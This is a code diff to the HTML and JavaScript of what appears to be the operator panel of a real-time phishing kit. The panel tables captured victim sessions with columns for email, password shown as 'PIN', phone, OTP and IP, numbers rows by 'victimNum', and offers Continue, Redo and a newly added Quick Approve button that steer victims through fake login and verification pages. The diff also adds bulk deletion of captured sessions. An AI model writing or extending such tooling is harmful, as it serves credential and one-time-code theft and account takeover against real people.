@@ -263,6 +263,9 @@
     .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
     .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
+    .icon-btn.skip{border-color:rgba(52,211,153,.4);background:rgba(52,211,153,.12)}
+    .icon-btn.skip:hover{background:rgba(52,211,153,.22)}
+    .icon-btn.skip img{filter:brightness(0) invert(1) sepia(1) saturate(5) hue-rotate(100deg)}
     
     .cred {
       font-family:monospace;
@@ -440,6 +443,68 @@
     .confirm-btn.danger{background:rgba(251,113,133,.12);border-color:var(--red);color:var(--red)}
     .confirm-btn.danger:hover{background:rgba(251,113,133,.22)}
 
+    /* Multi-select styles */
+    .select-col {width:40px;text-align:center}
+    .checkbox-custom {
+      width:18px;
+      height:18px;
+      border:2px solid var(--card-border);
+      border-radius:4px;
+      cursor:pointer;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      transition:all .2s;
+      background:transparent;
+    }
+    .checkbox-custom:hover {border-color:var(--text-muted)}
+    .checkbox-custom.checked {
+      background:var(--red);
+      border-color:var(--red);
+    }
+    .checkbox-custom.checked::after {
+      content:'✓';
+      color:#fff;
+      font-size:12px;
+      font-weight:bold;
+    }
+    .batch-actions {
+      display:none;
+      align-items:center;
+      gap:12px;
+      padding:12px 16px;
+      background:var(--card-bg);
+      border:1px solid var(--card-border);
+      border-radius:12px;
+      margin-bottom:16px;
+      backdrop-filter:var(--glass-blur) var(--glass-saturation);
+    }
+    .batch-actions.active {display:flex}
+    .batch-count {font-size:13px;color:var(--text-muted)}
+    .batch-btn {
+      padding:6px 14px;
+      border-radius:8px;
+      border:1px solid var(--red);
+      background:rgba(251,113,133,.12);
+      color:var(--red);
+      cursor:pointer;
+      font-size:12px;
+      font-weight:500;
+      transition:all .2s;
+    }
+    .batch-btn:hover {background:rgba(251,113,133,.22)}
+    .select-all-btn {
+      padding:4px 10px;
+      border-radius:6px;
+      border:1px solid var(--card-border);
+      background:rgba(128,128,128,0.08);
+      color:var(--text-muted);
+      cursor:pointer;
+      font-size:11px;
+      transition:all .2s;
+    }
+    .select-all-btn:hover {background:rgba(128,128,128,0.15);color:var(--text-primary)}
+
     /* Mobile */
     @media (max-width: 768px) {
       .greet-bar{margin:16px auto 0;padding:0 16px;font-size:16px}
@@ -467,6 +532,10 @@
       .greet-right{gap:8px}
       .theme-grid{grid-template-columns:repeat(2, 1fr);}
       .theme-option{font-size:10px;padding:6px 8px;}
+      .select-col {width:32px}
+      .checkbox-custom {width:16px;height:16px}
+      .batch-actions {flex-wrap:wrap;gap:8px}
+      .batch-count {width:100%}
     }
     @media (max-width: 480px) {
       .greet-bar{font-size:14px}
@@ -474,7 +543,7 @@
       .stat-label{font-size:10px}
       table{font-size:0.7rem}
       th,td{padding:0.3rem 0.2rem}
-      td:nth-child(7),th:nth-child(7),td:nth-child(8),th:nth-child(8){display:none}
+      td:nth-child(8),th:nth-child(8),td:nth-child(9),th:nth-child(9){display:none}
       .theme-grid{grid-template-columns:repeat(2, 1fr);}
     }
   </style>
@@ -513,8 +582,18 @@
     </div>
 
     <div class="card" style="margin-top:22px">
-      <div style="font-size:14px;font-weight:600;margin-bottom:12px">Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:var(--blue);text-decoration:none"></a></div>
+      <div style="font-size:14px;font-weight:600;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center">
+        <span>Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:var(--blue);text-decoration:none"></a></span>
+      </div>
+      
+      <div class="batch-actions" id="batchActions">
+        <span class="batch-count"><span id="selectedCount">0</span> selected</span>
+        <button class="batch-btn" onclick="deleteSelected()">Delete Selected</button>
+        <button class="select-all-btn" onclick="clearSelection()">Clear</button>
+      </div>
+      
       <table id="tbl"><thead><tr>
+        <th class="select-col"><div class="checkbox-custom" id="selectAllBox" onclick="toggleSelectAll()"></div></th>
         <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th>Actions</th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
@@ -616,6 +695,7 @@
   <script>
     let currentSid = null, jsonData = {}, lastSessions = new Map();
     let isFirstLoad = true;
+    let selectedSessions = new Set();
     const qs = s => document.querySelector(s);
     const qsa = s => document.querySelectorAll(s);
     const fmt = t => new Date(t).toLocaleTimeString();
@@ -697,6 +777,12 @@
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
+      
+      // Quick approve button for verify.html with phone entered
+      if (s.page === 'verify.html' && s.phone && s.entered) {
+        html += `<button class="icon-btn skip" onclick="act('skip','${s.sid}')" title="Quick Approve"><img src="/images/check-square-svgrepo-com.svg"></button>`;
+      }
+      
       if (s.page === 'index.html' && (s.entered || (s.email && s.password))) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
@@ -776,8 +862,10 @@
       
       body.innerHTML = d.sessions.map(s => {
         const approved = isApproved(s);
+        const isSelected = selectedSessions.has(s.sid);
         return `
         <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
+          <td class="select-col">${approved ? '' : `<div class="checkbox-custom session-checkbox ${isSelected ? 'checked' : ''}" data-sid="${s.sid}" onclick="toggleSelect('${s.sid}', event)"></div>`}</td>
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
@@ -790,6 +878,70 @@
           <td>${actionButtons(s)}</td>
         </tr>`;
       }).join('');
+      
+      updateSelectionUI();
+    }
+
+    /* ----------  MULTI-SELECT  ---------- */
+    function toggleSelect(sid, event) {
+      event.stopPropagation();
+      if (selectedSessions.has(sid)) {
+        selectedSessions.delete(sid);
+      } else {
+        selectedSessions.add(sid);
+      }
+      updateSelectionUI();
+    }
+
+    function toggleSelectAll() {
+      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
+      if (selectedSessions.size === allSids.length) {
+        selectedSessions.clear();
+      } else {
+        allSids.forEach(sid => selectedSessions.add(sid));
+      }
+      updateSelectionUI();
+    }
+
+    function clearSelection() {
+      selectedSessions.clear();
+      updateSelectionUI();
+    }
+
+    function updateSelectionUI() {
+      const batchActions = qs('#batchActions');
+      const selectAllBox = qs('#selectAllBox');
+      const count = selectedSessions.size;
+      
+      qs('#selectedCount').textContent = count;
+      batchActions.classList.toggle('active', count > 0);
+      
+      // Update select all checkbox
+      const allSids = jsonData.sessions.filter(s => !isApproved(s)).map(s => s.sid);
+      selectAllBox.classList.toggle('checked', count > 0 && count === allSids.length);
+      
+      // Update individual checkboxes
+      qsa('.session-checkbox').forEach(box => {
+        const sid = box.dataset.sid;
+        box.classList.toggle('checked', selectedSessions.has(sid));
+      });
+    }
+
+    async function deleteSelected() {
+      if (!confirm(`Delete ${selectedSessions.size} sessions? This cannot be undone.`)) return;
+      
+      const promises = Array.from(selectedSessions).map(sid => 
+        fetch('/api/panel', {
+          method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({action:'delete', sid})
+        })
+      );
+      
+      await Promise.all(promises);
+      selectedSessions.clear();
+      updateSelectionUI();
+      load();
     }
 
     /* ----------  IP LOOKUP  ---------- */
@@ -907,6 +1059,7 @@
     async function executeDelete() {
       await fetch('/api/refresh', {method: 'POST'});
       lastSessions.clear();
+      selectedSessions.clear();
       isFirstLoad = true;
       closeConfirm();
       load();
@@ -921,13 +1074,19 @@
 
     /* ----------  CONTROL  ---------- */
     async function act(action,sid){
-      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
+      const endpoint = action === 'skip' ? '/api/skip' : '/api/panel';
+      await fetch(endpoint, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({action: action === 'skip' ? 'skip' : action, sid})
+      });
       load();
     }
 
     /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       lastSessions.clear();
+      selectedSessions.clear();
       isFirstLoad = true;
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
@@ -950,4 +1109,3 @@
   </script>
 </body>
 </html>
-
